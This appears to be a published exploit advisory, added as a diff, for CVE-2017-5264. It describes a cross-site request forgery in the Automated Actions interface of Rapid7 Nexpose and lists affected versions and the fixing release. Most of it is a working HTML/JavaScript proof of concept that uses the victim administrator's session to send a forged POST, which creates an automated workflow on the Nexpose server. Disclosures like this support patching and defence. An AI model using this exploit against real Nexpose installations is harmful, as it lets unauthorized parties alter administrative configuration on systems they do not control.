@@ -1,0 +1,75 @@
+# Exploit Title: [Cross Site Request Forgery at Nexpose Automated Actions]
+# Release Date: [2017-12-13]
+# Exploit Author: [Shwetabh Vishnoi]
+# Link: https://www.linkedin.com/in/shwetabhvishnoi
+# Vendor Homepage: [https://www.rapid7.com/]
+# Software Link: [https://www.rapid7.com/products/nexpose/download/]
+# Tested on: [Windows,Linux,Mac]
+# CVE : [CVE-2017-5264]
+# Solution: Update to 6.4.66
+# Affected Version(s): Rapid7 Nexpose 6.4.65
+Rapid7 Nexpose 6.4.13
+Rapid7 Nexpose 6.4.12
+Rapid7 Nexpose 5.8.6
+Rapid7 Nexpose 5.8
+Rapid7 Nexpose 5.7.5
+Rapid7 Nexpose 5.5.4
+Rapid7 Nexpose 5.5.3
+Rapid7 Nexpose 5.4.8
+Rapid7 Nexpose 5.4.7
+Rapid7 Nexpose 5.4.6
+Rapid7 Nexpose 5.5.8
+Rapid7 Nexpose 5.5.7
+Rapid7 Nexpose 5.5.6
+Rapid7 Nexpose 5.5.5
+Rapid7 Nexpose 5.5.1
+Rapid7 Nexpose 5.4.9
+Rapid7 Nexpose 5.4.5
+Rapid7 Nexpose 5.4.4
+Rapid7 Nexpose 5.4.3
+Rapid7 Nexpose 5.4.2
+Rapid7 Nexpose 5.4.12
+Rapid7 Nexpose 5.4.11
+Rapid7 Nexpose 5.4.10
+Rapid7 Nexpose 5.4.1
+Rapid7 Nexpose 5.4
+
+Description: Versions of Nexpose prior to 6.4.66 fail to adequately
+validate the source of HTTP requests intended for the Automated
+Actions administrative web application, and are susceptible to a
+cross-site
+request forgery (CSRF) attack.
+
+Affected URL/endpoint:
+https://nexpose-server.com/eso/conductor-service/api/workflows
+
+Proof Of Concept:
+
+<html>
+  <body>
+    <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST",
+"https:\/\/nexpose-server.com\/eso\/conductor-service\/api\/workflows\/",
+true);
+        xhr.setRequestHeader("Accept", "application\/json,
+text\/javascript, *\/*; q=0.01");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "application\/json");
+        xhr.withCredentials = true;
+        var body =
+"{\"name\":\"test2\",\"steps\":[{\"serviceName\":\"nexpose\",\"stepConfiguration\":{\"typeName\":\"discover-known-assets\",\"previousTypeName\":\"\",\"configurationParams\":{\"valueClass\":\"Object\",\"objectType\":\"siteMetadata\",\"properties\":{\"siteID\":{\"valueClass\":\"Array\",\"items\":[{\"valueClass\":\"Integer\",\"value\":67}]},\"VULN_CATEGORY\":{\"valueClass\":\"Array\",\"items\":[{\"valueClass\":\"Object\",\"objectType\":\"VULN_CATEGORY_ITEM\",\"properties\":{\"operator\":{\"valueClass\":\"String\",\"value\":\"CONTAINS\"},\"operand1\":{\"valueClass\":\"String\",\"value\":\"dos\"}}}]}}}}},{\"serviceName\":\"nexpose\",\"stepConfiguration\":{\"typeName\":\"tag\",\"previousTypeName\":\"discover-known-assets\",\"configurationParams\":{\"valueClass\":\"Object\",\"objectType\":\"tag\",\"properties\":{\"tagID\":{\"value\":339,\"valueClass\":\"Integer\",\"text\":\"Test\"}}}}}]}";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <form action="#">
+      <input type="button" value="Submit request"
+onclick="submitRequest();" />
+    </form>
+  </body>
+</html>
